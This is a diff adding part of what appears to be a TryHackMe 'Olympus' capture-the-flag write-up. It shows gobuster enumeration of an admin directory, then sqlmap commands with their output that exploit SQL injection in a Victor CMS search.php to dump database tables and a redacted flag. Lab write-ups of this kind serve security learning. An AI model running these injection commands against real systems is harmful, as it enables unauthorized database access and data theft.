@@ -129,3 +129,130 @@ Finished
 There is admin panel maybe i can fuzz that.
 
 Also there is search.php maybe i can use that file to make sql injection.
+
+
+
+```bash
+❯ gobuster dir -w common.txt -u http://olympus.thm/~webmaster/admin/ -x md,js,html,php,py,css,txt -t 50  
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://olympus.thm/~webmaster/admin/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,md,js,html,php,py,css
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/categories.php       (Status: 302) [Size: 9799] [--> ../index.php]
+/comment.php          (Status: 302) [Size: 7778] [--> ../index.php]
+/css                  (Status: 301) [Size: 325] [--> http://olympus.thm/~webmaster/admin/css/]
+/fonts                (Status: 301) [Size: 327] [--> http://olympus.thm/~webmaster/admin/fonts/]
+/function.php         (Status: 200) [Size: 0]
+/img                  (Status: 301) [Size: 325] [--> http://olympus.thm/~webmaster/admin/img/]
+/includes             (Status: 301) [Size: 330] [--> http://olympus.thm/~webmaster/admin/includes/]
+/index.php            (Status: 302) [Size: 11408] [--> ../index.php]
+/index.php            (Status: 302) [Size: 11408] [--> ../index.php]
+/js                   (Status: 301) [Size: 324] [--> http://olympus.thm/~webmaster/admin/js/]
+/posts.php            (Status: 302) [Size: 9684] [--> ../index.php]
+/profile.php          (Status: 302) [Size: 7410] [--> ../index.php]
+/users.php            (Status: 302) [Size: 9070] [--> ../index.php]
+Progress: 37912 / 37912 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+We can see that a lot of the paths redirecs to the normal site.
+But there is function.php which is empty and some paths which includes libraries for code.
+We can go to the js libraries.
+
+
+![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo2.png){: width="972" height="589" }
+
+
+As you can this site uses jquerry 1.9.1 and some plugins. Maybe we can check that if the plugins or this jqurry version have vulns.
+
+And this jquerry version have CVE-2019-11358 but I don't think it is usable beacuse it is client side.
+
+So turn back to the sql injection part:
+
+Maybe before that we need to google some victor Cms vulns.
+
+
+And I found one.
+<https://www.exploit-db.com/exploits/48734>
+
+We can use this command:
+```bash
+sqlmap -u "http://example.com/CMSsite/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
+```
+
+
+```bash
+❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 3 -D olympus --tables
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] olympus
+[*] performance_schema
+[*] phpmyadmin
+[*] sys
+Database: olympus
+[6 tables]
++------------+
+| categories |
+| chats      |
+| comments   |
+| flag       |
+| posts      |
+| users      |
++------------+
+```
+
+And than we can get the flag
+
+```bash
+❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 3 -D olympus -T flag --columns --dump
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[*] information_schema
+[*] mysql
+[*] olympus
+[*] performance_schema
+[*] phpmyadmin
+[*] sys
+
+Database: olympus
+Table: flag
+[1 column]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| flag   | varchar(255) |
++--------+--------------+
++---------------------------+
+| flag                      |
++---------------------------+
+| flag{*******************} |
++---------------------------+
+
+[*] ending @ 21:23:00 /2025-06-29/
+```
